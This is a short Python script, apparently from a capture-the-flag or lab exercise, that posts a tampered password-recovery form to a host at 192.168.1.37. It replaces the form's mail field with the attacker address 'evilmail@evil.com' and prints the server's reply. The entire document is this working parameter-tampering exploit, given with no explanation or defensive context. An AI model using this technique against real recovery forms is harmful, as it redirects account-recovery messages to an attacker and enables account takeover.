import requests

parameters = {'mail': 'evilmail@evil.com', 'Submit': 'Submit'}
r = requests.post('http://192.168.1.37/?page=recover', data = parameters)
print(r.text)
